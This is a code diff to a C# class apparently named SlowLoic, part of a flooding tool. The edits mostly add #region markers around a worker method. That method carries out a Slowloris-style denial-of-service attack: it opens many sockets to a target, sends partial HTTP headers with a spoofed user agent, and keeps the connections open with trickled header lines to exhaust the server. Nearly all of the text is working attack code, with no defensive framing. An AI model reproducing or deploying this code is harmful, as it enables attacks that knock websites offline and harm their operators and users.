@@ -72,23 +72,37 @@ namespace GAS.Core
         }
         private void bw_DoWork(object indexinthreads)
         {
+            #region wait 4 full init
             while (!init) Thread.Sleep(100);
             int MY_INDEX_FOR_WORK = (int) indexinthreads;
+            #endregion
+            #region attack
             try
             {
-                // header set-up
-                byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
-                byte[] tbuf = System.Text.Encoding.ASCII.GetBytes("X-a: b{\r\n");
-                States[MY_INDEX_FOR_WORK] = ReqState.Ready;
-                var stop = DateTime.Now;
+                #region header set-up
+                    byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+                    byte[] tbuf = System.Text.Encoding.ASCII.GetBytes("X-a: b{\r\n");
+                    States[MY_INDEX_FOR_WORK] = ReqState.Ready;
+                    var stop = DateTime.Now;
+                #endregion
                 while (IsFlooding)
                 {
                     stop = DateTime.Now.AddMilliseconds(Timeout);
                     States[MY_INDEX_FOR_WORK] = ReqState.Connecting; // SET STATE TO CONNECTING //
-                    // we have to do this really slow 
                     while (IsDelayed && (DateTime.Now < stop))
                     {
-                        if (_random) sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+                        #region Headers
+                        if (_random) sbuf = System.Text.Encoding.ASCII.GetBytes(
+                            String.Format(
+                            "{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}",
+                            _subSite, 
+                            Functions.RandomString(),
+                            Environment.NewLine,
+                            _dns,
+                            ((_useget) ? "GET" : "POST"), 
+                            ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
+                        #endregion
+                        #region Request
                         var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                         try
                         {
@@ -98,6 +112,8 @@ namespace GAS.Core
                             socket.Send(sbuf);
                         }
                         catch { }
+                        #endregion
+                        #region Check result
                         if (socket.Connected)
                         {
                             _lSockets[MY_INDEX_FOR_WORK].Add(socket);
@@ -105,38 +121,46 @@ namespace GAS.Core
                         }
                         IsDelayed = (_lSockets[MY_INDEX_FOR_WORK].Count < _nSockets);
                         if (IsDelayed && (Delay > 0)) System.Threading.Thread.Sleep(Delay);
+                        #endregion
                     }
                     States[MY_INDEX_FOR_WORK] = ReqState.Requesting;
                     if (_randcmds) tbuf = System.Text.Encoding.ASCII.GetBytes("X-a: b"+Functions.RandomString()+"\r\n");
+                    #region keep the sockets alive
                     for (int i = (_lSockets[MY_INDEX_FOR_WORK].Count - 1); i >= 0; i--)
-                    { // keep the sockets alive
+                    {
                         try
                         {
+                            #region Remove dead
                             if (!_lSockets[MY_INDEX_FOR_WORK][i].Connected || (_lSockets[MY_INDEX_FOR_WORK][i].Send(tbuf) <= 0))
                             {
                                 _lSockets[MY_INDEX_FOR_WORK].RemoveAt(i);
                                 Failed++;
                                 Requested--; // the "requested" number in the stats shows the actual open sockets
                             }
+                            #endregion
                             else Downloaded++; // this number is actually BS .. but we wanna see sth happen :D
                         }
+                        #region Remove dead
                         catch
                         {
                             _lSockets[MY_INDEX_FOR_WORK].RemoveAt(i);
                             Failed++;
                             Requested--;
                         }
+                        #endregion
                     }
+                   #endregion
                     States[MY_INDEX_FOR_WORK] = ReqState.Completed;
                     IsDelayed = (_lSockets[MY_INDEX_FOR_WORK].Count < _nSockets);
                     if (!IsDelayed) System.Threading.Thread.Sleep(Timeout);
                 }
             }
             catch { States[MY_INDEX_FOR_WORK] = ReqState.Failed; }
+            #endregion
+            #region Cleanup
             finally
             {
                 IsFlooding = false;
-                // not so sure about the graceful shutdown ... but why not?
                 for (int i = (_lSockets[MY_INDEX_FOR_WORK].Count - 1); i >= 0; i--)
                     try { _lSockets[MY_INDEX_FOR_WORK][i].Close(); }
                     catch { }
@@ -144,6 +168,7 @@ namespace GAS.Core
                 States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                 IsDelayed = true;
             }
+            #endregion
         }
-    } // class SlowLoic
+    }
 }
